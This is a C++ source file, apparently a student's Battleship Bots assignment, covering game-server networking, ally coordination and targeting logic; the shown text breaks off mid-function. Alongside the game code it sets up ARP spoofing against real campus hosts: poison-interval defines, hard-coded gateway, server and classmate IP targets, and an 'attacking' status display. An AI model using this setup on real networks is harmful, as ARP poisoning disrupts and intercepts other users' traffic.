/**
* -------------------------------
* |     Author  Information     |
* -------------------------------
* Reece Benson - 16021424
* BSc Computer Science - Year 1
* Battleship Bots
*
* -------------------------------
* |    Solution Information     |
* -------------------------------
* This project includes everything to do with Assignment 2, Battleship Bots.
*
* -------------------------------
* |         User Advice         |
* -------------------------------
* > Build Tools error, haven't installed v140 or v120?
* > > Project -> Emulator Properties -> General -> Build Tools -> Set to either V120 or V140 (depending on PC)
**/
#pragma region Includes & Definitions
// > Default Includes
#include "stdafx.h"
#include <algorithm>
#include <winsock2.h>
#include <math.h>
#include <stdarg.h>
#include <stdio.h>
#include <windows.h>
#include <conio.h>
#include <string>
#include <thread>
#include <vector>
#include <fstream>
#include <iostream>
#pragma region ARP / PCAP
// > Console Logger so we can print to another console
#include "ConsoleLogger.h"
CConsoleLoggerEx arpCnsl;
// > Arp Spoofing
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "wpcap.lib")
#include <pcap.h>
#include <Ws2tcpip.h>
// > Arp Helpers
#include "ether.h"
#include "arp.h"
#include "arp_helper.h"
#include "utils.h"
// > Dummy Bots
#define NUM_BOTS 25
bool spawningDummyBots = false;
Bot bots[NUM_BOTS];
#pragma endregion
using namespace std;
//#pragma comment(lib, "wsock32.lib")
///////////////////////
//      Student      //
///////////////////////
#define STUDENT_NUMBER		"16021424"					// < Student Number (Display Name)
#define STUDENT_FIRSTNAME	"Reece"						// < First Name (Printed to output from server)
#define STUDENT_FAMILYNAME	"Benson"					// < Last Name (Printed to output from server)
#define MY_SHIP				SHIPTYPE_BATTLESHIP			// < Set ship type
///////////////////////
//      Sockets      //
///////////////////////
//#define IP_ADDRESS_SERVER	"127.0.0.1"					// < Servers IP Address
#define IP_ADDRESS_SERVER	"164.11.80.69"				// < Servers IP Address
//#define IP_ADDRESS_SERVER	"164.11.80.37"				// < Servers IP Address
#define PORT_SEND			1924						// < Sending port
#define PORT_RECEIVE		1925						// < Receiving port
#define PORT_ALLY_RECEIVE	6834						// < Ally receiving port
#define MAX_BUFFER_SIZE		500							// < Maximum buffer size
///////////////////////
//       Ships       //
///////////////////////
#define MAX_SHIPS			200							// < Maximum ships in array
#define SHIPTYPE_BATTLESHIP	"0"							// < [SET] Ship type - Battleship
#define SHIPTYPE_FRIGATE	"1"							// < [SET] Ship type - Frigate
#define SHIPTYPE_SUBMARINE	"2"							// < [SET] Ship type - Submarine
#define SHIPTYPE_FAKE		"-1"						// < [SET] Ship type - Fake
///////////////////////
//     Movement      //
///////////////////////
#define MOVE_LEFT			-1							// < [MOVE] Left
#define MOVE_RIGHT			 1							// < [MOVE] Right
#define MOVE_UP				 1							// < [MOVE] Up
#define MOVE_DOWN			-1							// < [MOVE] Down
#define MOVE_FAST			 2							// < [MOVE] Fast
#define MOVE_SLOW			 1							// < [MOVE] Slow
///////////////////////
//       Allies      //
///////////////////////
#define MAX_ALLIES			3							// < The maximum amount of allies available
#define UNKNOWN			   -1							// < Fallback (used to send attacks from the senders IP address)
#define JONAS				0							// < Jonas's Index
#define CHRIS				1							// < Chris's Index
#define HARRY				2							// < Harry's Index
#define JONAS_IPADDRESS		"164.11.80.37"				// < Jonas's IPv4
#define CHRIS_IPADDRESS		"164.11.80.49"				// < Chris's IPv4
#define HARRY_IPADDRESS		"164.11.80.65"				// < Harry's IPv4
bool	isLeader			= false;					// < Am I Leading?
///////////////////////
//       Arping      //
///////////////////////
// ARP Spoofing Defines
#define CAP_SNAPLEN 65536
#define CAP_TIMEOUT_MS 1000
#define POISON_INTERVAL_MS 100
#define UNPOISON_RETRIES 10
#define ARP_DEFGW_IP	(164 + (11 << 8) + (80 << 16) + (1 << 24))
#define ARP_ME_IP		(164 + (11 << 8) + (80 << 16) + (26 << 24))
#define ARP_SERVER_IP	(164 + (11 << 8) + (80 << 16) + (69 << 24))
#define ARP_JONAS_IP	(164 + (11 << 8) + (80 << 16) + (37 << 24))
#define ARP_CHRIS_IP	(164 + (11 << 8) + (80 << 16) + (49 << 24))
#define ARP_HARRY_IP	(164 + (11 << 8) + (80 << 16) + (65 << 24))
#define ARP_ATTACK_STOP_MESSAGE	"1"
#pragma endregion

#pragma region Variables
///////////////////////
//      Sockets      //
///////////////////////

HANDLE		cnsl;										// < The default console handle
SOCKADDR_IN	sendto_addr;								// < The address our bot will send to
SOCKADDR_IN	receive_addr;								// < The address our bot will receive from
SOCKADDR_IN allysendaddr;								// < Our allies address to send to
SOCKADDR_IN	allyaddr[MAX_ALLIES];						// < Hold our ally IP addresses
SOCKET		sock_send;									// < This is our socket, it is the handle to the IO address to read/write packets
SOCKET		sock_recv;									// < This is our socket, it is the handle to the IO address to read/write packets
SOCKET		allysock;									// < This is our ally socket, it is the handle to the IO address to read/write packets
WSADATA		wdata;										// < Contains information for our sockets
char		InputBuffer[MAX_BUFFER_SIZE];				// < The buffer received from the server

///////////////////////
//      Structs      //
///////////////////////

// > Struct Declaration
struct Ship {
	int  index,
		 x,
		 y,
		 health,
		 flag,
		 type,
		 distance;
	bool ally,
		 isbattleship = false,
		 ignored = false;
};

// > Ally Struct Declaration
struct AllyShip {
	char* name;
	int   x,
		  y,
		  health,
		  flag,
		  type,
		  distance,
		  nos;
	bool  initialised = false,
		  following = false;
};

///////////////////////
//     Variables     //
///////////////////////

// > Bot Vars
int				number_of_ships;							// < How many ships are visible to the bot
int				number_of_enemies;							// < How many enemies are visible
int				number_of_friends;							// < How many friendlies are visible

// > Messages
bool			message = false;							// < [FLAG] Message flag
char			MsgBuffer[MAX_BUFFER_SIZE];					// < The buffer for our sent messages

// > States
bool			fire = false;								// < [FLAG] Fire flag
int				fireX;										// < The X coordinate of where we will fire
int				fireY;										// < The Y coordinate of where we will fire
int				firingDistance = 0;							// < The firing distance from our ship type
bool			moveShip = false;							// < [FLAG] Move flag
int				moveX;										// < The increment of how much we will be moving on the X axis
int				moveY;										// < The increment of how much we will be moving on the Y axis

// > Flags
bool			setFlag = true;								// < [FLAG] Flag flag
int				new_flag = 0;								// < Our new flag to be set on the next call

// > Movement
int				up_down = MOVE_UP*MOVE_SLOW;				// < Our Y movement
int				left_right = MOVE_LEFT*MOVE_FAST;			// < Our X movement

// > Ship Structures
Ship			shipStruct[MAX_SHIPS];						// < Our struct array for all of the ships we handle from the server
Ship			me;											// < Our ship
const struct Ship emptyShip;								// < A struct to empty out the ships in the ship struct array

// > Functions
bool			shipLowestHealth(Ship left, Ship right);	// < [STD::SORT] Used to sort the ships by lowest health
bool			shipClosest(Ship left, Ship right);			// < [STD::SORT] Used to sort the ships by distance
bool			shipIsAlly(Ship left, Ship right);			// < [STD::SORT] Used to sort the ships by ally

// > Allies
AllyShip		allyArray[MAX_ALLIES];						// < Array to store allies information in
bool			recvUpdatedServerData = false;				// < [FLAG] Check if we just received data from the server
bool			allyDataRecv = false;						// < [FLAG] Check if we just received data from our ally
bool			alliesAllInitialised = false;				// < [FLAG] Check if all of our allies have sent us some data
char			allyDataBuffer[4096];						// < The buffer to store what our ally sends us
int				allyCacheCounter = 0;						// < This counter will be used to store our allies X and Y coordinates every 250 ticks
bool			allyStuckTogether = false;					// < [FLAG] Check if our allies are stuck within the same proximity for too long
bool			alliesTogether = 0;							// < [FLAG] Check if all our allies are grouped together in a pack
#define			FLAG_HIDE 732								// < XOR value to encrypt our flag

// > Packs
Ship			shipsInPack[MAX_SHIPS];						// < Hold the pack ships into this array so we can fire at the pack member with the lowest health
int				packCount = 0;								// < Keep a count of how many are in the pack
int				packHealthTotal[3] = { 0, 0, 0 };			// < Records the amount of health each type of ship in the pack has
int				packTypeTotal[3] = { 0, 0, 0 };				// < Records the amount of each ship type of ship the pack has
bool			packVisible = false;						// < [FLAG] Check if the pack is visible

// > Keyboard Flags
bool			shouldWeRespawn = false;					// < [FLAG] Modified by keyboard input, forces the bot to respawn.
bool			forcedMovement = false;						// < [FLAG] Enables the use of forcing the bot where to move
bool			forceMove[4] = { 0, 0, 0, 0 };				// < [FLAGS] Modified by keyboard input, forces the bot to move in a certain direction
#pragma endregion

#pragma region Function Definitions
// -> Function Declarations
void   play();																		// < Holds the tactics of our bot
void   handleBufferData(char* buf, char* addr_ip);									// < Handles all of the server and ally data
// -> User Interface
void   updateUIColour(int col);														// < Change text colour of the default console
// -> Messages
void   sendMsg(char* dest, char* source, char* msg);								// < Sends a message to another client
void   messageReceived(char* msg);													// < Handles received messages from another client
// -> Movement
void   crawlInDirection(int x, int y);												// < Moves our bot in a certain direction
void   crawlToPos(int x, int y);													// < Moves our bot to a certain position
void   reverseDirectionFromShip(Ship ship);											// < Moves our bot in the opposite direction from the ship
int    getDistance(int x, int y, Ship s);											// < Gets the distance from the us/defined ship in accordance to the x, y coordinates
int    getDistance(int x, int y, AllyShip s);										// < Gets the distance from the us/defined ship in accordance to the x, y coordinates
// -> Firing
void   fireAtShip(int x, int y);													// < Fires at the coordinates
// -> Flags
void   setNewFlag(int newFlag);														// < Changes our bots flag
void   encryptFlag();																// < Encrypts our bots flag
bool   decryptFlag(int shipFlag, int shipX, int shipY);								// < Decrypts the bots flag data
// -> Structs
void   addShipToStruct(int i, int x, int y, int h, int t, int f, int d, bool a);	// < Add the ship to the struct array
void   emptyShipStruct();															// < Empty our ship struct array
void   emptyPackStruct();															// < Empty our pack struct array
// -> Ally
void   setupAllies();																// < Sets up our ally addresses, sockets, leadership, etc
void   handleAlly(int who, char buffer[4096]);										// < Handle our separate ally
void   handleAllyData();															// < Handle our allies data
char*  getAllyName(int who);														// < Gets the allies name in a char array format
// -> Packs
bool   packInSight();																// < Check if a pack is within sight
// -> Ships
char*  getShipType(int type);														// < Return the ship type
bool   canShipBeHit(int distance);													// < Can the enemy ship be hit
bool   canWeBeHit(Ship ship);														// < Can our ship be hit from the defined ship
#pragma endregion

#pragma region Structure Sorting
// Name:  shipLowestHealth(Ship left, Ship right);
// Args:  2
// Desc:  This is used by std::sort.
bool shipLowestHealth(Ship left, Ship right)
{
	return left.health < right.health;
}

// Name:  shipClosest(Ship left, Ship right);
// Args:  2
// Desc:  This is used by std::sort.
bool shipClosest(Ship left, Ship right)
{
	return left.distance < right.distance;
}

// Name:  shipIsAlly(Ship left, Ship right);
// Args:  2
// Desc:  This is used by std::sort.
bool shipIsAlly(Ship left, Ship right)
{
	return left.ally < right.ally;
}

// Name:  emptyShipStruct();
// Args:  N/A
// Desc:  This will clear the ship struct array.
void emptyShipStruct()
{
	for (int s = 0; s < MAX_SHIPS; s++)
		shipStruct[s] = emptyShip;

	// > Reset our variables
	number_of_ships = 0;
	number_of_enemies = 0;
}

// Name:  emptyPackStruct();
// Args:  N/A
// Desc:  This will clear the packed ship struct array.
void emptyPackStruct()
{
	// > Clear struct
	for (int s = 0; s < MAX_SHIPS; s++)
		shipsInPack[s] = emptyShip;

	// > Clear health
	for (int i = 0; i < 3; i++)
	{
		packHealthTotal[i] = 0;
		packTypeTotal[i] = 0;
	}

	// > Reset our variables
	packVisible = false;
	packCount = 0;
}
#pragma endregion

#pragma region User Interface
// Name:  update(int y, const char *format, ...);
// Args:  2 + user defined
// Desc:  This function updates the text on a specific line of the console and is
//		  also a replica of what the "printf" function does.
int update(int y, const char *format, ...)
{
	// > Move our console cursor (11 + y because 11 is the line after the header text)
	COORD coord = { 0, 11 + (short)y };

	// > Set the position
	SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);

	// > Write to console ('printf' replica)
	va_list arg;
	int done;

	va_start(arg, format);
	done = vfprintf(stdout, format, arg);
	va_end(arg);

	return done;
}

// Name:  update(int y, const char *format, ...);
// Args:  2 + user defined
// Desc:  This function updates the text on a specific line of the console and is
//		  also a replica of what the "printf" function does.
int updatexy(int x, int y, const char *format, ...)
{
	// > Move our console cursor (11 + y because 11 is the line after the header text)
	COORD coord = { x, 11 + (short)y };

	// > Set the position
	SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);

	// > Write to console ('printf' replica)
	va_list arg;
	int done;

	va_start(arg, format);
	done = vfprintf(stdout, format, arg);
	va_end(arg);

	return done;
}

// Name:  updateBotInfo(char *studentName, int x, int y, int health);
// Args:  4
// Desc:  This function updates the user interface's bot information section
//		  with the updated values.
void updateBotInfo(char *studentName, int x, int y, int health, char* state, int flag)
{
	// -> Bot Name
	updateUIColour(0);
	update(0, " > Bot Name: ");
	updateUIColour(2);
	updatexy(13, 0, "%s [%d]                           ", studentName, flag);

	// -> Position
	updateUIColour(0);
	update(1, " > Position: ");
	updateUIColour(2);
	updatexy(13, 1, "%d, %d                            ", x, y);

	// -> Health
	updateUIColour(0);
	update(2, " > Health: ");
	updateUIColour(2);
	updatexy(11, 2, "%d                                ", health, flag);

	// -> State
	updateUIColour(0);
	update(3, " > Bot State: ");
	updateUIColour(2);
	updatexy(14, 3, "%s                                ", state);

	// Reset UI Colour
	updateUIColour(0);
}

// Name:  updateShipInfo(int enemies, int friendlies);
// Args:  2
// Desc:  This function updates the user interface's ship information section
//		  with the updated values.
void updateShipInfo(int totalships, int enemies, int friendlies)
{
	// -> Ship Count
	updateUIColour(0);
	update(5, " > Ships: ");
	updateUIColour(2);
	updatexy(10, 5, "%d", totalships);

	// -> Enemy Count
	updateUIColour(0);
	update(6, " > Enemies: ");
	updateUIColour(2);
	updatexy(12, 6, "%d ", enemies);

	// -> Friendly Count
	updateUIColour(0);
	updatexy(14, 6, " | Friendlies: ");
	updateUIColour(2);
	updatexy(30, 6, "%d                ", friendlies);

	// Reset UI Colour
	updateUIColour(0);
}

// Name:  updateUIColour(int col);
// Args:  1
// Desc:  Change's the text colour of the default console.
void updateUIColour(int col)
{
	switch (col)
	{
		default:
		case 0: // default
			SetConsoleTextAttribute(cnsl, (FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_GREEN));
			break;
		case 1: // red
			SetConsoleTextAttribute(cnsl, (FOREGROUND_RED | FOREGROUND_INTENSITY));
			break;
		case 2: // green
			SetConsoleTextAttribute(cnsl, (FOREGROUND_GREEN | FOREGROUND_INTENSITY));
			break;
		case 3: // blue
			SetConsoleTextAttribute(cnsl, (FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY));
			break;
	}
}

// Name:  displayHeaderText();
// Args:  N/A
// Desc:  This function simply prints out some ASCII art and a brief description
//		  of the application to the console.
void displayHeaderText()
{
	// > Get our default console's handle
	cnsl = GetStdHandle(STD_OUTPUT_HANDLE);

	// > Display Header
	updateUIColour(1);
	printf("     ___       _   _   _           _     _           \n");
	printf("    / __\\ __ _| |_| |_| | ___  ___| |__ (_)_ __  ___ \n");
	printf("   /__\\/// _` | __| __| |/ _ \\/ __| '_ \\| | '_ \\/ __|\n");
	printf("  / \\/  \\ (_| | |_| |_| |  __/\\__ \\ | | | | |_) \\__ \\\n");
	printf("  \\_____/\\__,_|\\__|\\__|_|\\___||___/_| |_|_| .__/|___/\n");
	printf("                                          |_|        \n");
	updateUIColour(2);
	printf("                   Battleship Bots                   \n");
	printf("        Bot created by Reece Benson - 16021424       \n");
	printf("           UWE Computer and Network Systems          \n");
	printf("                    Assignment  2                    \n");
	updateUIColour(0);
	printf("-----------------------------------------------------\n");

	// > Setup Sections
	// -> 'My Information'
	update(4,  "-----------------------------------------------------");
	// -> 'Ship Counts'
	update(7,  "-----------------------------------------------------");
	// -> 'Enemy Info'
	update(15, "-----------------------------------------------------");
	update(16, " > [ALLY] Ally Details:                              ");
	update(17, " > No data is currently being received by any allies.");
	// -> 'Ally Info'
	update(22, "-----------------------------------------------------");
	update(23, " >                                                   ");
	update(24, " >                                                   ");
	update(25, "-----------------------------------------------------");
	update(26, " > Ships in sight:                                   ");
	update(27, " > No ship information received yet.                 ");

	// > Placeholder
	update(0, " > Connecting to server...");
}

// Name:  updateAttackerInfo(int atkrSide, int atkrIP);
// Args:  1
// Desc:  This function updates the user interface's attack information.
void updateAttackerInfo(int atkrSide, int atkrIP, bool isEnabled)
{
	if (isEnabled)
		update(16, " > [ATTACK] [Q = DISABLE] Currently attacking 164.11.%d.%d                   ", atkrSide, atkrIP);
	else
		update(16, " > [ATTACK] Attack is currently disabled. Press 'R' to enable attack.        ");
}

// Name:  clearLog(int startY, int endY);
// Args:  2
// Desc:  This function will clear the log from startY to endY.
void clearLog(int startY, int endY)
{
	for (int i = startY; i <= endY; i++)
	{
		update(i, " >                                                                        ");
	}
}

// Name:  s2ws(const std::string &s);
// Args:  1
// Desc:  This function converts strings to wide strings.
std::wstring s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}
#pragma endregion

#pragma region Information
// Name:  getShipType(int type);
// Args:  1
// Desc:  Translates the battleships type (from int) into a string.
char* getShipType(int type)
{
	switch (type)
	{
		case 0:  return "Battleship";
		case 1:  return "Frigate";
		case 2:  return "Submarine";
		default: return "Unknown";
	}
}

// Name:  getDistance(x, y, s);
// Args:  3
// Desc:  Get the distance from the x and y location from a ship (default = me)
int getDistance(int x, int y, Ship s = me)
{
	return (int)sqrt((double)((x - s.x)*(x - s.x) + (y - s.y)*(y - s.y)));
}

// Name:  getDistance(x, y, s);
// Args:  3
// Desc:  Get the distance from the x and y location from an ally ship
int getDistance(int x, int y, AllyShip s)
{
	return (int)sqrt((double)((x - s.x)*(x - s.x) + (y - s.y)*(y - s.y)));
}
#pragma endregion

#pragma region Movement
// Name:  crawlToPos(int x, int y);
// Args:  2
// Desc:  Move our bot towards the set coordinates.
void crawlToPos(int x, int y)
{
	// > Default Values
	int moveSpeedX = MOVE_FAST;
	int moveSpeedY = MOVE_FAST;

	// > Get differences between our ship and the new pos
	int diffX = me.x - x;
	int diffY = me.y - y;

	// > If we're close / ontop of the enemy ship, move slowly
	if (abs(diffX) == 1) moveSpeedX = MOVE_SLOW;
	if (abs(diffY) == 1) moveSpeedY = MOVE_SLOW;

	// > Set our X movement
	if (diffX > 0)		left_right = MOVE_LEFT  * moveSpeedX;
	else if (diffX < 0) left_right = MOVE_RIGHT * moveSpeedX;
	else				left_right = 0;

	// > Set our Y movement
	if (diffY > 0)		up_down = MOVE_DOWN * moveSpeedY;
	else if (diffY < 0) up_down = MOVE_UP * moveSpeedY;
	else				up_down = 2;

	// > Let's move!
	crawlInDirection(left_right, up_down);
}

// Name:  crawlInDirection(int x, int y);
// Args:  2
// Desc:  Move our bot in a specified direction.
void crawlInDirection(int x, int y)
{
	if (x < -2) x = -2;
	if (x >  2) x = 2;
	if (y < -2) y = -2;
	if (y >  2) y = 2;

	// > Set our moving ship flag
	moveShip = true;
	moveX = x;
	moveY = y;
}

// Name:  reverseDirectionFromShip(Ship ship);
// Args:  N/A
// Desc:  This function will reverse the direction of the ship to avoid from being hit by an enemy ship
void reverseDirectionFromShip(Ship ship)
{
	// > Check our health, we can't "MOVE_FAST" when we're below 5 health!
	// > If we try to use "MOVE_FAST" when at 5 health, we won't move.
	int movingSpeed = MOVE_FAST;
	if (me.health <= 4) movingSpeed = MOVE_SLOW;

	if (ship.x > me.x)
		// > We want to go left
		left_right = MOVE_LEFT*movingSpeed;
	else if (ship.x < me.x)
		// > We want to go right
		left_right = MOVE_RIGHT*movingSpeed;
	else if (ship.x == me.x)
		// > We don't want to move our X
		left_right = 0;

	if (ship.y > me.y)
		// > We want to move down
		up_down = MOVE_DOWN*movingSpeed;
	else if (ship.y < me.y)
		// > We want to move up
		up_down = MOVE_UP*movingSpeed;
	else if (ship.y == me.y)
		// > We don't want to move our Y
		up_down = 0;

	// > On the odd occasion we're on the exact same coordinates
	if (up_down == 0 && left_right == 0)
	{
		// > Use default moving techniques
		if (me.y > 900) up_down = MOVE_DOWN*movingSpeed;
		if (me.x < 200) left_right = MOVE_RIGHT*movingSpeed;
		if (me.y < 100) up_down = MOVE_UP*movingSpeed;
		if (me.x > 800) left_right = MOVE_LEFT*movingSpeed;
	}
}
#pragma endregion

#pragma region Damage
// Name:  fireAtShip(int x, int y);
// Args:  2
// Desc:  Fires at the specified coordinates.
void fireAtShip(int x, int y)
{
	fire = true;
	fireX = x;
	fireY = y;
}

// Name:  canShipBeHit(int distance);
// Args:  1
// Desc:  Checks to see if the ship is in a distance which can be fired at
bool canShipBeHit(int distance)
{
	if (me.type == 0)				// < Battleships can see upto 200, fire upto 100
		return (distance <= 102) ? true : false;
	else if (me.type == 1)			// < Frigates can see upto 200, fire upto 100
		return (distance <= 77) ? true : false;
	else if (me.type == 2)			// < Submarines can see upto 100, fire upto 50
		return (distance <= 52) ? true : false;
	else 							// < Fake battleship (can't see anything or hit anything)
		return false;
}

// Name:  canWeBeHit(Ship ship);
// Args:  1
// Desc:  Check if we can be hit from the opposing ship
bool canWeBeHit(Ship ship)
{
	// > Override
	if (((ship.health + 5) < me.health) && !packVisible)
		return false;

	switch (ship.type)
	{
		// > Battleship
		case 0:
			if (ship.distance <= 99)
				return true;
			else
				return false;
			break;
		// > Frigate
		case 1:
			if (ship.distance <= 74)
				return true;
			else
				return false;
			break;
		// > Submarine
		case 2:
			if (ship.distance <= 49)
				return true;
			else
				return false;
			break;
		// > Unknown
		default:
			if (ship.distance <= 10)
				return true;
			else
				return false;
	}
}
#pragma endregion

#pragma region Flags
// Name:  setNewFlag(int newFlag);
// Args:  1
// Desc:  Set a new flag
void setNewFlag(int newFlag)
{
	new_flag = newFlag;
	setFlag = true;
}

// Name:  encryptFlag();
// Args:  N/A
// Desc:  Get our encrypted flag
int getEncryptedFlag()
{
	int flagVal;
	flagVal = me.x;
	flagVal = (flagVal << 16) + me.y;
	flagVal = flagVal ^ FLAG_HIDE;
	return flagVal;
}

// Name:  encryptFlag();
// Args:  N/A
// Desc:  Encrypt our flag
void encryptFlag()
{
	int flagVal;
	flagVal = me.x;
	flagVal = (flagVal << 16) + me.y;
	flagVal = flagVal ^ FLAG_HIDE;
	setNewFlag(flagVal);
}

// Name:  decryptFlag(int shipFlag, int shipX, int shipY);
// Args:  3
// Desc:  Return whether or not the ship is an ally or not
bool decryptFlag(int shipFlag, int shipX, int shipY)
{
	int leftSide, rightSide, allowance = 3;
	shipFlag = shipFlag ^ FLAG_HIDE;
	rightSide = shipFlag & 0xFFFF;
	leftSide = (shipFlag >> 16) & 0xFFFF;

	int differenceX = abs(leftSide - shipX);
	int differenceY = abs(rightSide - shipY);
	if (differenceX < allowance && differenceY < allowance)
		return true;
	else
		return false;
}
#pragma endregion

#pragma region Messages
// Name:  sendMessage();
// Args:  N/A
// Desc:  Send a message to another bot
void sendMsg(char* dest, char* source, char* msg)
{
	// > Set our flag and add our message to the buffer
	message = true;
	sprintf_s(MsgBuffer, "Message %s,%s,%s,%s", STUDENT_NUMBER, dest, source, msg);
}

// Name:  messageReceived(char* msg);
// Args:  N/A
// Desc:  Handle the message that has been received by another bot
void messageReceived(char* msg)
{
	// > Print the message
	update(24, " > [MSG] Message received: %s", msg);
}
#pragma endregion

#pragma region Alliance
// Name:  setupAllies();
// Args:  N/A
// Desc:  This will set up anything to do with allies - leadership, sockets, etc.
void setupAllies()
{
	// > Declare ally memory addresses
	for (int a = 0; a < MAX_ALLIES; a++)
	{
		memset(&allyaddr[a], 0, sizeof(SOCKADDR_IN));
		allyaddr[a].sin_family = AF_INET;
		allyaddr[a].sin_port = htons(PORT_RECEIVE);
	}

	// > Assign IP Addresses to memory
	allyaddr[JONAS].sin_addr.s_addr = inet_addr(JONAS_IPADDRESS);
	allyaddr[CHRIS].sin_addr.s_addr = inet_addr(CHRIS_IPADDRESS);
	allyaddr[HARRY].sin_addr.s_addr = inet_addr(HARRY_IPADDRESS);

	// > Setup our ally array
	allyArray[JONAS].initialised = false;
	allyArray[CHRIS].initialised = false;
	allyArray[HARRY].initialised = false;
}

// Name:  getAllyName(int who);
// Args:  1
// Desc:  Returns a char array of the allies name
char* getAllyName(int who)
{
	switch (who)
	{
	case JONAS: return "JONAS"; break;
	case CHRIS: return "CHRIS"; break;
	case HARRY: return "HARRY"; break;
	default: return "Unknown"; break;
	}
}

// Name:  handleAlly(int who, char buffer[4096]);
// Args:  2
// Desc:  Handle separate ally data
void handleAlly(int who, char buffer[4096])
{
	// > Reset our flag
	allyDataRecv = false;

	// > Check our ally isn't invalid
	if (who == UNKNOWN) {
		update(25, " > [ALLY] Data received from unknown ally: %s", buffer);
		return;
	}

	// > Read buffer into temporary values
	char* name = getAllyName(who);
	int   x, y, health, flag, type, nos;

	// > Scan our buffer
	sscanf_s(buffer, "SQUAD %d,%d,%d,%d,%d,%d $", &x, &y, &health, &flag, &type, &nos);

	// > Check this is a valid ally
	if (decryptFlag(flag, x, y))
	{
		if (!allyArray[who].initialised)
			number_of_friends++;

		// > Place into our ally array
		allyArray[who].name = name;
		allyArray[who].x = x;
		allyArray[who].y = y;
		allyArray[who].health = health;
		allyArray[who].type = type;
		allyArray[who].distance = getDistance(x, y, me);
		allyArray[who].nos = nos;
		allyArray[who].initialised = true;
	}

	// > Check if all our allies are connected
	if (allyArray[JONAS].initialised && allyArray[CHRIS].initialised && allyArray[HARRY].initialised)
		alliesAllInitialised = true;
}

bool checkAreAlliesNear()
{
	// > Variables
	bool alliesClose = false;
	int i;

	// > Check each initialised ally
	for (i = 0; i < MAX_ALLIES; i++)
	{
		// > Ignore uninitialised allies
		if (!allyArray[i].initialised)
			continue;

		// > Set our alliesClose flag to 'true' if atleast one ally is within firing range
		if (canShipBeHit(allyArray[i].distance))
			alliesClose = true;
	}

	return alliesClose;
}
#pragma endregion

#pragma region Packs
// Name:  checkForPacks();
// Args:  N/A
// Desc:  Returns true/false as to whether there is a pack in close proximity
bool checkForPacks()
{
	// > Empty our pack struct
	emptyPackStruct();

	// > Variables
	Ship current_ship;

	// > Iterate other each bot
	for (int x = 0; x < number_of_ships; x++)
	{
		// > Check that the ship is not an ally
		if (shipStruct[x].ally)
			continue;

		// > Update our current ship
		current_ship = shipStruct[x];

		// > Add this ship to the pack struct
		shipsInPack[packCount] = current_ship;
		packTypeTotal[current_ship.type]++;
		packHealthTotal[current_ship.type] += current_ship.health;
		packCount++;

		// > Iterate other each bot again
		for (int i = 0; i < number_of_ships; i++)
		{
			// > Check that it's not the same bot
			if (shipStruct[i].index == current_ship.index || shipStruct[i].ally)
				continue;

			// > Check if other bots are within distance of the current ship
			if (getDistance(shipStruct[i].x, shipStruct[i].y, current_ship) <= 25)
			{
				shipsInPack[packCount] = shipStruct[i];
				packCount++;
				packTypeTotal[shipStruct[i].type]++;
				packHealthTotal[shipStruct[i].type] += shipStruct[i].health;
			}
		}

		// > Check if there is 2 or more ships together
		if (packCount >= 2)
		{
			// > If the total from the ships together is lower than 15, pretend there isn't a pack in sight
			packVisible = true;
			break;
		}
		else
		{
			// > Reset our data
			packVisible = false;
			emptyPackStruct();
		}
	}

	return packVisible;
}
#pragma endregion

#pragma region Main
// Name:  play();
// Args:  N/A
// Desc:  This plays Battleships on every call.
// Extra: This function was renamed from "tactics();" to "play();"
void play()
{
	// > Variables
	int i, x, allies = 0;
	bool avoidPack = false;

	// > Boundary Movements
	// -> Original boundaries [me.y > 900 | me.x < 200 | me.y < 100 | me.x > 800]
	if (me.y > 700) up_down = MOVE_DOWN*MOVE_FAST;
	if (me.x < 200) left_right = MOVE_RIGHT*MOVE_FAST;
	if (me.y < 200) up_down = MOVE_UP*MOVE_FAST;
	if (me.x > 700) left_right = MOVE_LEFT*MOVE_FAST;

	// > Sort array
	std::sort(shipStruct, shipStruct + number_of_ships, shipClosest);		// > Move the closest ships to the front of the array
	std::sort(shipStruct, shipStruct + number_of_ships, shipIsAlly);		// > Move allies to the end of the array

	// > Print the ships around us to our enemy console
	clearLog(27, 33); // < Clear log before printing to it
	for (i = 0; i < number_of_ships; i++)
		update(27 + i, " > [%d]: (%d, %d) H=%d T=%d F=%d D=%d A=%s ME=%s          ", shipStruct[i].index, shipStruct[i].x, shipStruct[i].y, shipStruct[i].health, shipStruct[i].type, shipStruct[i].flag, shipStruct[i].distance, (shipStruct[i].ally ? "Yes" : "No"), (shipStruct[i].index == me.index ? "Yes" : "No"));

	// > Clear our log
	if (number_of_enemies == 0)
	{
		clearLog(8, 14);  // < Clear enemy log
		clearLog(23, 24); // < Clear packs log

		if (number_of_friends == 0)
			clearLog(16, 21); // < Clear ally log
	}

	// > Handle Friendlies
	if (number_of_friends > 0)
	{
		// > Update UI
		update(16, " > [ALLY] Ally Details:                                    ");
		for (i = 0; i < MAX_ALLIES; i++)
		{
			if (allyArray[i].initialised)
			{
				update(17 + i, " > [%s] > (%d, %d) [%d] [%d] [%s] [%d] [%s]             ", allyArray[i].name, allyArray[i].x, allyArray[i].y, allyArray[i].health, allyArray[i].distance, getShipType(allyArray[i].type), allyArray[i].nos, allyArray[i].following ? "Following" : "Not Following");
				allies++;
			}
		}

		// > Check if all allies have been initialised
		if (allies == MAX_ALLIES)
			alliesAllInitialised = true;
		
		// > Pack up with our allies
		if (alliesAllInitialised)
		{
			int alliesTogetherCount = 0;

			for (i = 0; i < allies; i++)
			{
				// > Reset our following flags
				allyArray[i].following = false;

				// > Update our following flag depending on ally ship type
				switch (allyArray[i].type)
				{
					case 0:
						if (allyArray[i].distance <= 25)
							allyArray[i].following = true;
						break;
					case 1:
						if (allyArray[i].distance <= 15)
							allyArray[i].following = true;
						break;
					case 2:
						if (allyArray[i].distance <= 10)
							allyArray[i].following = true;
						break;
				}
			}

			// > Find our closest ally
			AllyShip closestAlly = allyArray[0];
			for (i = 0; i < allies; i++)
			{
				if ((allyArray[i].distance <= closestAlly.distance) && (!allyArray[i].following))
					closestAlly = allyArray[i];

